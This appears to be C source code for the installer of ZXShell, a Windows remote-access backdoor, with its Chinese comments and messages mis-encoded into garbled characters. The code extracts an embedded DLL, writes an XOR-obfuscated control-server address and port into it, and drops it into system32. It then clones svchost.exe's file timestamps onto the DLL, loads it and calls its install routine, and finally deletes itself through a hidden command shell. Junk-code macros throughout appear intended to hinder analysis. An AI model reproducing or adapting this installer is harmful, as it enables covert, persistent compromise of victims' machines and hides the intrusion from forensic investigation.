//���أ� ����Ϊconsole��windows
#define PRINTINFO

#include <winsock2.h>
#include <windows.h>
#include <stdio.h>
#include <shlwapi.h>
#include <Dbghelp.h>
#include <shlobj.h>
#include <shellapi.h>

#include "..\zxsCommon\debugoutput.h"
#include "..\zxsCommon\zxsWinAPI.h"
#include "..\zxsCommon\SpamCode.h"


#include "resource.h"
#include "exe.h"

#pragma comment(lib, "shlwapi.lib")
#pragma comment(lib, "Dbghelp.lib")

#if defined PRINTINFO
#pragma comment(linker, "/subsystem:console")
#else
#pragma comment(linker, "/subsystem:windows")
#endif

const char ZXMUTEX  []= "@_ZXSHELL_@";

extern "C"
{

char dllName[50] = "\0";
char szIP[100]="����������";
int Port=1985;
DWORD vPasswd = 0;
BOOL AutoDel = TRUE;

}

LPCTSTR lpMemApp;
DWORD TotalSize;

typedef void WINAPI LPShellMain();
typedef DWORD WINAPI LPShellMainThread(LPVOID lParam);
typedef DWORD *(__stdcall *IamHere)(LPVOID lParam);
typedef BOOL *(__stdcall *Install)();

#pragma pack(push, 1)
struct _CFG
{
	DWORD flag;
	char IP[100];
	int Port;
	DWORD passwdcrc32;
};
#pragma pack(pop)


BOOL InsInit()
{
	// Open the named mutex
	SECURITY_ATTRIBUTES sa;
	sa.bInheritHandle = TRUE;
	sa.lpSecurityDescriptor = NULL;
	sa.nLength = sizeof(SECURITY_ATTRIBUTES);
	HANDLE mutex = ZXSAPI::CreateMutex(&sa, FALSE, ZXMUTEX);
	if (mutex == NULL)
		return FALSE;

	// Check that the mutex didn't already exist
	if (GetLastError() == ERROR_ALREADY_EXISTS)
	{
		CloseHandle(mutex);
		return FALSE;
	}
	CloseHandle(mutex);
	return TRUE;
}

int MessageBox(HWND hWnd, UINT uType, char *title, const char *szMsg, ...)
{
	va_list args;
	int n;
	char szText[8192];
	va_start(args, szMsg);
	n = vsprintf(szText, szMsg, args);
	va_end(args);
	return MessageBox(hWnd, szText, title, uType);
}

void DoXOR(DWORD key, char *data, int len)
{
	while(len--)
		*(data++) ^= key;
}

void Delme()
{
	
	SPAMFUNCTION
		
    SHELLEXECUTEINFO sei;

    TCHAR szModule [MAX_PATH],szComspec[MAX_PATH], szParams [MAX_PATH];

    // get file path names
    if((GetModuleFileName(0,szModule,MAX_PATH)!=0) &&
		(GetShortPathName(szModule,szModule,MAX_PATH)!=0) &&  (GetEnvironmentVariable("COMSPEC",szComspec,MAX_PATH)!=0))
    {
        // create comspec parameters
        lstrcpy(szParams,"/c del \""); // run a single command to...
        lstrcat(szParams, szModule); // del(ete) module file and...
        lstrcat(szParams, "\" > nul"); // output results to nowhere

        // set struct members
        sei.cbSize = sizeof(sei);
        sei.hwnd = 0;
        sei.lpVerb = "Open";
        sei.lpFile= szComspec;
        sei.lpParameters = szParams;
        sei.lpDirectory = 0;
        sei.nShow = SW_HIDE;
        sei.fMask = SEE_MASK_NOCLOSEPROCESS;

        // give all CPU cycles to current process
        SetPriorityClass(GetCurrentProcess(),REALTIME_PRIORITY_CLASS);
        SetThreadPriority(GetCurrentThread(),THREAD_PRIORITY_TIME_CRITICAL);

        // execute command shell
        if(ShellExecuteEx(&sei))
        {
            // freeze command shell process
            SetPriorityClass(sei.hProcess,IDLE_PRIORITY_CLASS);
            SetProcessPriorityBoost(sei.hProcess,TRUE);

            // notify explorer shell of deletion
            SHChangeNotify(SHCNE_DELETE,SHCNF_PATH,szModule,0);
            //return TRUE;
        }
        else
        {
            // otherwise, restore normal priority
            SetPriorityClass(GetCurrentProcess(),NORMAL_PRIORITY_CLASS);
            SetThreadPriority(GetCurrentThread(),THREAD_PRIORITY_NORMAL);
        }
    }
}


BOOL CloneFileTime(char *lpFileName_src, char *lpFileName_dest)
{
	
	SPAMFUNCTION
		
	HANDLE hFile_src = 0, hFile_dest = 0;
	FILETIME lpCreationTime; // �ļ��еĴ���ʱ�� 
	FILETIME lpLastAccessTime; // ���ļ��е��������ʱ�� 
	FILETIME lpLastWriteTime; // ���ļ��е�����޸�ʱ�� 

	hFile_src = ZXSAPI::CreateFile(lpFileName_src, 
        GENERIC_READ, 
        FILE_SHARE_READ, 
        NULL, 
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL, 
        NULL);
	if(hFile_src == INVALID_HANDLE_VALUE){
		goto error;
	}
	hFile_dest = ZXSAPI::CreateFile(lpFileName_dest, 
        GENERIC_READ|GENERIC_WRITE, 
        FILE_SHARE_READ, 
        NULL, 
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL, 
        NULL);
	if(hFile_dest == INVALID_HANDLE_VALUE){
		goto error;
	}
	if(! GetFileTime(hFile_src, &lpCreationTime, &lpLastAccessTime, &lpLastWriteTime))
		goto error;
	if(! SetFileTime(hFile_dest, &lpCreationTime, &lpLastAccessTime, &lpLastWriteTime))
		goto error;

	CloseHandle(hFile_src);
	CloseHandle(hFile_dest);
	return 1;
error:
	if(hFile_src != INVALID_HANDLE_VALUE)
		CloseHandle(hFile_src);
	if(hFile_dest != INVALID_HANDLE_VALUE)
		CloseHandle(hFile_dest);
	return 0;
}

bool GetDLLFileExports(LPCTSTR lpMemFile, char *FunctionName, DWORD *pFunOffSet)
{
	
	SPAMFUNCTION
		

    PIMAGE_DOS_HEADER pImg_DOS_Header;
    PIMAGE_NT_HEADERS pImg_NT_Header;
    PIMAGE_EXPORT_DIRECTORY pImg_Export_Dir;


    pImg_DOS_Header = (PIMAGE_DOS_HEADER)lpMemFile;
    pImg_NT_Header = (PIMAGE_NT_HEADERS)(
            (LONG)pImg_DOS_Header + (LONG)pImg_DOS_Header->e_lfanew);

    if(IsBadReadPtr(pImg_NT_Header, sizeof(IMAGE_NT_HEADERS))
            || pImg_NT_Header->Signature != IMAGE_NT_SIGNATURE)
    {
		return false;
    }

    pImg_Export_Dir = (PIMAGE_EXPORT_DIRECTORY)pImg_NT_Header->OptionalHeader
            .DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    if(!pImg_Export_Dir)
    {
		return false;
    }
    // 63 63 72 75 6E 2E 63 6F 6D
    pImg_Export_Dir= (PIMAGE_EXPORT_DIRECTORY)ImageRvaToVa(pImg_NT_Header,
            pImg_DOS_Header, (DWORD)pImg_Export_Dir, 0);

    DWORD **ppdwNames = (DWORD **)pImg_Export_Dir->AddressOfNames;
	WORD **ppOrd = (WORD **)pImg_Export_Dir->AddressOfNameOrdinals;
	DWORD **dwAddr = (DWORD **)pImg_Export_Dir->AddressOfFunctions;

    ppdwNames = (PDWORD*)ImageRvaToVa(pImg_NT_Header,
            pImg_DOS_Header, (DWORD)ppdwNames, 0);
    ppOrd = (PWORD*)ImageRvaToVa(pImg_NT_Header,
            pImg_DOS_Header, (DWORD)ppOrd, 0);
    dwAddr = (PDWORD*)ImageRvaToVa(pImg_NT_Header,
            pImg_DOS_Header, (DWORD)dwAddr, 0);


    if(!ppdwNames || !ppOrd || !dwAddr)
    {
        return false;
    }
	UINT nCount = pImg_Export_Dir->NumberOfNames;
    for(UINT i=0; i < nCount; i++)
    {
        char *szFunc=(PSTR)ImageRvaToVa(pImg_NT_Header, pImg_DOS_Header, (DWORD)*ppdwNames, 0);

        if(strcmp(FunctionName, szFunc) == 0)
		{
			i = ((WORD*)ppOrd)[i]; 
			*pFunOffSet = ((DWORD*)dwAddr)[i];
			return true;
		}
        ppdwNames++;
    }

    return false;
}

BOOL GetShellMainApp()
{
	
	SPAMFUNCTION
		
	HMODULE hmod;
	HRSRC hSndResource;
	HGLOBAL hGlobalMem;
	//������Դ����Ϣ
	hmod = GetModuleHandle(NULL);
	hSndResource = FindResource(hmod, MAKEINTRESOURCE(IDR_SHELLMAIN),TEXT("SHELLMAIN"));
	if(!hSndResource)
		return FALSE;
	//װ����Դ���ݲ�����
	hGlobalMem = LoadResource(hmod,hSndResource);
	if(!hGlobalMem)
		return FALSE;
	lpMemApp = (LPCSTR)LockResource(hGlobalMem);
	if(!lpMemApp)
		return FALSE;
	TotalSize = SizeofResource(hmod, hSndResource);
	return TRUE;
}

BOOL ModifyData()
{
	
	SPAMFUNCTION
		
	DWORD siteOffset, portOffset;
	if(!GetDLLFileExports(lpMemApp, "MySite", &siteOffset))
		return FALSE;
	if(!GetDLLFileExports(lpMemApp, "MywPort", &portOffset))
		return FALSE;

	char *pMySite = (char*)(lpMemApp + siteOffset);
	int *pMywPort = (int*)(lpMemApp + portOffset);

	strcpy(pMySite, szIP);

	*pMywPort = Port;

	return TRUE;
}



BOOL WriteToFile(char *lpFileName, char *Buff, int Datalen)
{
	
	SPAMFUNCTION
		
	bool bcfgStructExist;
	_CFG cfg;
	_CFG *pCfgInfo = (_CFG*)(Buff + Datalen - sizeof(_CFG));

	memset(&cfg, 0, sizeof(_CFG));
	cfg.flag = 5201314;
	strcpy(cfg.IP, szIP);
	cfg.Port = Port;
	cfg.passwdcrc32 = vPasswd;

	if(pCfgInfo->flag == 5201314)
		bcfgStructExist = true;
	else
		bcfgStructExist = false;

	if(bcfgStructExist)
	{
		memcpy(pCfgInfo, &cfg, sizeof(_CFG));
	}


	HANDLE hFile = ZXSAPI::CreateFile(lpFileName, 
        GENERIC_WRITE, 
        FILE_SHARE_WRITE, 
        NULL, 
        CREATE_ALWAYS, 
        FILE_ATTRIBUTE_NORMAL, 
        NULL);
	if(hFile == INVALID_HANDLE_VALUE){
		return FALSE;
	}

	DWORD nBytesLeft = Datalen;
	DWORD dwNumOfBytesWritten = 0;
	char *pBuf = Buff;
	while(nBytesLeft > 0) {
		if(!ZXSAPI::WriteFile(hFile, pBuf, nBytesLeft, &dwNumOfBytesWritten, NULL)) {
			CloseHandle(hFile);
			return FALSE;
		}
		pBuf += dwNumOfBytesWritten;
		nBytesLeft -= dwNumOfBytesWritten;
	}
	if(!bcfgStructExist)
	{
		WriteFile(hFile, &cfg, sizeof(_CFG), &dwNumOfBytesWritten, NULL);
	}
	SetEndOfFile(hFile);

	CloseHandle(hFile);
	return TRUE;
}

BOOL VerifyFileName(char *lpFileName)
{
	
	SPAMFUNCTION
		
	HANDLE hFile = ZXSAPI::CreateFile(lpFileName, 
        GENERIC_WRITE, 
        FILE_SHARE_WRITE, 
        NULL, 
        CREATE_ALWAYS, 
        FILE_ATTRIBUTE_NORMAL, 
        NULL);
	if(hFile == INVALID_HANDLE_VALUE){
		return FALSE;
	}
	CloseHandle(hFile);
	return TRUE;
}

void GetUsableFileName(char *Dir, char *lpPrefixString, char *lpPostfixString, char *FileName)
{
	
	SPAMFUNCTION
		
	int idx = 0;
	if(lpPrefixString == NULL)
		lpPrefixString = "";
	if(lpPostfixString == NULL)
		lpPostfixString = "";
	sprintf(FileName, "%s\\%s%s", Dir, lpPrefixString, lpPostfixString);
	if(VerifyFileName(FileName))
		return;

	while(! VerifyFileName(FileName) && idx < 100)
	{
		sprintf(FileName, "%s\\%s%d%s", Dir, lpPrefixString, idx++, lpPostfixString);
	}
}

#if defined PRINTINFO
int main()
#else
int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow)
#endif
{

#if defined _ZXS_PRIVATE
		__printf("InitZXGetProcAddrFunc entry\r\n");
		if(!ZXSAPI::InitZXGetProcAddrFunc())
		{
			__printf("InitZXGetProcAddrFunc error\r\n");
			return 0;
		}
		__printf("InitZXShellSubtleAPI entry\r\n");
		if(!ZXSAPI::InitZXShellSubtleAPI())
		{
			__printf("InitZXShellSubtleAPI error\r\n");
			return 0;
		}

#endif

	SPAMFUNCTION

	int argc = __argc;
	char **argv = __argv;

	int nRetVal;
	BOOL Mutex = TRUE;
	BOOL Test = FALSE;
	char SysDirPath[MAX_PATH];
	char dllFileName[MAX_PATH];
	char tmpBuf[MAX_PATH];

	if(!GetSystemDirectory(SysDirPath, MAX_PATH))
		return 0;

	if(lstrlen(dllName) == 0)
	{
		if(!GetModuleFileName(0, tmpBuf, MAX_PATH))
			return 0;
		PathStripPath(tmpBuf);
	}else
	{
		strcpy(tmpBuf, dllName);
	}

	if(strrchr(tmpBuf, '.'))
		strcpy(strrchr(tmpBuf, '.'), "");
	GetUsableFileName(SysDirPath, tmpBuf, ".dll", dllFileName);

	char *Usage = ""
		"Usage:\r\n"
		"[-help] [-IP] <URL> [-Port] <port> [-FileName] <dllpath> [-test] [-del]\r\n"
		"-help      ��ʾ����Ϣ\r\n"
		"<URL>      ����\r\n"
		"<port>     ���ƶ˶˿�\r\n"
		"<dllpath>  ָ��DLL�ͷŵ�����·��,Ĭ��Ϊsystem32��,����Ϊ [���ļ���.dll]\r\n"
		"-test      ����װ����������������Ϣ����ȷ��\r\n"
		"-del       ��װ�ɹ����Զ�ɾ����EXE�ļ�(Ĭ��)\r\n"
		"-nondel    ȡ���Զ�ɾ��������\r\n"
		"Example:\r\n"
		"    zxshell.exe (û������ֱ�����Ѿ����õ���Ϣ���а�װ)\r\n"
		"    zxshell.exe -test (���Ա��������е������ܷ���)\r\n"
		"    zxshell.exe -ip xx.vicp.net -port 1234 -filename c:\\x.dll -test (����ָ������Ϣ�ܷ���)\r\n"
		"    zxshell.exe -ip xx.vicp.net -port 1234 -filename c:\\foxy.dll (��ָ������Ϣ���а�װ)\r\n"
		"    zxshell.exe -ip http://xx.xx.xx/myip.txt\r\n";

	//��ȡ���� start
	for(int i=1; i<argc; i++)
	{
		if(argv[i][0] == '-' || argv[i][0] == '/')
		{
			if(!stricmp(&argv[i][1], "help"))
			{
				printf(Usage);
				return 0;
			}else
			if(!stricmp(&argv[i][1], "test"))
			{
				Test = TRUE;
			}else
			if(!stricmp(&argv[i][1], "del"))
			{
				AutoDel = TRUE;
			}else
			if(!stricmp(&argv[i][1], "nondel"))
			{
				AutoDel = FALSE;
			}/*else
			if(!stricmp(&argv[i][1], "nonMutex"))
			{
				Mutex = FALSE;
			}*/

		}else
		{
			if(!stricmp(&argv[i-1][1], "IP"))
			{
				nRetVal = _snprintf(szIP, sizeof(szIP), "%s", argv[i]);
				DoXOR(0x1985, szIP, nRetVal+1);
			}else if(!stricmp(&argv[i-1][1], "Port"))
			{
				Port = atoi(argv[i]);
			}else if(!stricmp(&argv[i-1][1], "FileName"))
			{
				strcpy(dllFileName, argv[i]);
			}
		}
	}//end
/*
	if(Mutex)
	{
		if(!InsInit())
		{
			if(AutoDel)
				Delme();
			return 0;
		}
	}
*/
	if(!GetShellMainApp())
	{
		printf("Can not Get The Image File.\r\n");
		return FALSE;
	}
	
	//if(!SetShellCfgInfo())
	//if(!ModifyData())
	//{
	//	printf("Can not Config The Image File.\r\n");
		//return FALSE;
	//}

	printf("WriteToFile %s\r\n", dllFileName);
	if(!WriteToFile(dllFileName, (char*)lpMemApp, TotalSize))
	{
		printf("Create File Failed.(%d)\r\n", GetLastError());
		return 0;
	}

	sprintf(tmpBuf, "%s\\svchost.exe", SysDirPath);

	CloneFileTime(tmpBuf, dllFileName);

	strncpy(tmpBuf, szIP, 99);
	DoXOR(0x1985, tmpBuf, 99);
	printf("����: %s:%d\r\n", tmpBuf, Port);
	printf("DLL�ļ��ͷŵ�: %s\r\n", dllFileName);
	HMODULE hDll = ZXSAPI::LoadLibrary(dllFileName);

	if(!hDll)
	{
		printf("LoadLibrary DllFile Failed.(%d)\r\n", GetLastError());
		return 0;
	}
	
	SPAMFUNCTION
		

////	IamHere pIamHere = (IamHere)GetProcAddress(hDll, "IamHere");
	LPShellMainThread *ShellMainThread = (LPShellMainThread*)ZXSAPI::GetProcAddress(hDll, "ShellMainThread");
	LPShellMain *ShellMain = (LPShellMain*)ZXSAPI::GetProcAddress(hDll, "ShellMain");
	Install pInstall = (Install)ZXSAPI::GetProcAddress(hDll, "Install");
	if(
		////!pIamHere
		!ShellMainThread
		|| !ShellMain
		|| !pInstall)
	{
		printf("Get Entry Function Failed.\r\n");
		goto exit;
	}

	if(Test)
	{
		//MoveFileEx(dllFileName, NULL, MOVEFILE_DELAY_UNTIL_REBOOT);
		//ShellMain();Sleep(-1);
		//pIamHere(0);
		ShellMainThread(NULL);
		return 0;
	}

	if(pInstall())
	{
		if(AutoDel)
			Delme();
	}
exit:
	//*((char*)123) = '\0';
	return 0;
}